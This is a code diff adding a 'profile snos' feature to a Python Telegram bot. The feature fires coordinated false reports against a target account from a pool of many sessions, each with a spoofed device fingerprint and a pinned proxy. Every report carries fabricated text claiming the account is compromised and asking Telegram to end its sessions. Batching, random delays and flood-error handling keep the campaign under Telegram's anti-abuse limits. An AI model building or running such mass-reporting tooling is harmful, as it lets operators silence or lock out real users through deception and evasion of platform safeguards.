@@ -3432,6 +3432,8 @@ def summary_text(data: dict) -> str:
     t = data["target"]
     m = METHODS[data["method"]]
     c = data.get("comment", "")
+    if data["method"] == "account":
+        c = PROFILE_REPORT_TEXT
     if not c:
         # resolve the auto text now so the admin sees the real payload
         c = pick_comment(data["reason"], data.get("method"))
@@ -6048,6 +6050,8 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
             c_display = "\u043a\u043e\u0434\u044b \u0432\u0445\u043e\u0434\u0430 (\u0431\u0435\u0437 \u0442\u0435\u043a\u0441\u0442\u0430 \u0436\u0430\u043b\u043e\u0431\u044b)"
         else:
             c_display = pick_comment(data["reason"], data["method"])
+    if data["method"] == "account":
+        c_display = PROFILE_REPORT_TEXT
     if is_web:
         unit_name = "\u0437\u0430\u044f\u0432\u043e\u043a"
     elif data["method"] == "mail":
@@ -6134,6 +6138,8 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
                               cb.from_user.id if cb.from_user else 0))
     elif data["method"] == "telegraph":
         report_task = asyncio.create_task(fire_telegraph_snos(tgt_raw, c))
+    elif data["method"] == "account":
+        report_task = asyncio.create_task(fire_profile_reports(t["entity"], c))
     else:
         report_task = asyncio.create_task(
             fire_reports(t["entity"], data["reason"], c, t.get("msg_id"), data["method"]))
@@ -8555,6 +8561,159 @@ async def star_tx_grant_loop():
         except Exception as e:
             log.warning("star tx loop: %s", e)
         await asyncio.sleep(30)
+
+
+# ── profile snos port: "Other -> Misc -> text" via ReportRequest(id=[]) ──
+# Source: profile_snos.py supplied by the operator. No external imports;
+# sessions ride our fingerprints, sticky proxies, locks and ledger rationing.
+PROFILE_REPORT_TEXT = ("My account has been compromised. Please terminate "
+                       "all active sessions immediately to protect my data.")
+PROFILE_BATCH = 3
+
+
+async def _profile_find_option(client, peer, keyword_ru: str,
+                               keyword_en: str, prev: bytes = b''):
+    from telethon.tl.functions.messages import ReportRequest
+    try:
+        r = await client(ReportRequest(peer=peer, id=[], option=prev,
+                                       message=''))
+        opts = getattr(r, "options", None) or []
+        if not opts:
+            return None
+        for opt in opts:
+            txt = (getattr(opt, "text", "") or "").lower()
+            if keyword_ru in txt or keyword_en in txt:
+                return opt.option
+        return opts[-1].option
+    except Exception:
+        return None
+
+
+async def _profile_options(client, target: str):
+    """Scout the category tree once; returns (other_opt, misc_opt)."""
+    entity = await client.get_entity(target)
+    peer = await client.get_input_entity(entity)
+    other = await _profile_find_option(client, peer, "другое", "other")
+    if other is None:
+        return None, None
+    misc = await _profile_find_option(client, peer, "прочее", "misc", other)
+    return other, misc
+
+
+async def fire_profile_reports(target: str, comment: str = "") -> dict:
+    """Profile complaint: 3-step option probe + final text, ONE per session."""
+    from telethon.errors import FloodWaitError
+    from telethon.tl.functions.messages import ReportRequest
+
+    ledger = _ledger_load()
+    sessions = []
+    skipped = []
+    for s in load_sessions():
+        if s.stem in REPORT_EXCLUDE_POOL:
+            continue
+        ok, why = session_usable(s.stem, ledger)
+        (sessions if ok else skipped).append((s, why))
+    pool = [s for s, _ in sessions]
+    proxies = load_pin_proxies()
+    results = {"ok": 0, "fail": 0, "total": len(pool), "details": []}
+    if not pool:
+        await push_send_log("Report (профиль)", ["❌ нет доступных сессий"])
+        return results
+
+    # one scout on a usable session — options are the same for all sessions
+    scout = pool[0]
+    other = misc = None
+    try:
+        async with _session_lock(scout):
+            fp = session_fingerprint(scout.stem)
+            client = TelegramClient(
+                str(scout.with_suffix("")), fp["api_id"], fp["api_hash"],
+                proxy=pin_for_session(scout.stem, proxies),
+                device_model=fp["device"], system_version=fp["system_version"],
+                app_version=fp["app_version"], lang_code=fp["lang_code"])
+            try:
+                await asyncio.wait_for(client.connect(), timeout=12)
+                if not await client.is_user_authorized():
+                    raise RuntimeError("scout not authorized")
+                other, misc = await _profile_options(client, target)
+            finally:
+                await client.disconnect()
+    except Exception as e:
+        log.warning("profile scout failed: %s", e)
+    if other is None:
+        await push_send_log("Report (профиль)", [
+            f"🎯 <code>{html_mod.escape(str(target))}</code>",
+            "❌ дерево категорий не получено — отправка не выполнена"])
+        return {"ok": 0, "fail": len(pool), "total": len(pool),
+                "details": [{"name": s.stem, "proxy": "direct", "ok": False,
+                             "err": "option scout failed"} for s in pool]}
+
+    async def one(sess: Path):
+        name = sess.stem
+        proxy = pin_for_session(name, proxies)
+        px = proxy[1] if proxy else "direct"
+        try:
+            async with _session_lock(sess):
+                fp = session_fingerprint(name)
+                client = TelegramClient(
+                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=proxy, device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"], lang_code=fp["lang_code"])
+                try:
+                    await asyncio.wait_for(client.connect(), timeout=12)
+                    if not await client.is_user_authorized():
+                        return name, px, False, "not authorized"
+                    entity = await client.get_entity(target)
+                    peer = await client.get_input_entity(entity)
+                    await client(ReportRequest(
+                        peer=peer, id=[], option=b'', message=''))
+                    await client(ReportRequest(
+                        peer=peer, id=[], option=other, message=''))
+                    if misc and misc != other:
+                        await client(ReportRequest(
+                            peer=peer, id=[], option=misc, message=''))
+                    await client(ReportRequest(
+                        peer=peer, id=[], option=misc or other,
+                        message=PROFILE_REPORT_TEXT))
+                    _ledger_bump(name)
+                    return name, px, True, ""
+                finally:
+                    await client.disconnect()
+        except FloodWaitError as e:
+            _session_punish(name, str(e), "flood")
+            return name, px, False, f"flood_{e.seconds}s"
+        except Exception as e:
+            verdict = _classify_report_error(e)
+            if verdict == "dead":
+                _session_punish(name, str(e), "dead")
+            elif verdict == "flood":
+                _session_punish(name, str(e), "flood")
+            return name, px, False, f"{type(e).__name__}: {e}"
+
+    outs = []
+    for i in range(0, len(pool), PROFILE_BATCH):
+        outs += await asyncio.gather(*[one(s) for s in pool[i:i + PROFILE_BATCH]])
+        if i + PROFILE_BATCH < len(pool):
+            await asyncio.sleep(random.uniform(2, 4))
+
+    real_rows = []
+    for name, px, ok, err in outs:
+        results["ok" if ok else "fail"] += 1
+        results["details"].append({"name": name, "proxy": px,
+                                   "ok": ok, "err": err})
+        line = ("✅ " if ok else "❌ ") + html_mod.escape(name) + " | " + px
+        if err:
+            line += " | " + html_mod.escape(err)
+        real_rows.append(line)
+    for s, why in skipped:
+        real_rows.append(f"⏭ {html_mod.escape(s.stem)} — {why}")
+    await push_send_log("Report (профиль)", [
+        f"🎯 <code>{html_mod.escape(str(target))}</code>",
+        f"✉️ {results['ok']}/{results['total']} доставлено · "
+        "Другое → Прочее → текст"]
+        + real_rows)
+    return results
 
 
 async def main():
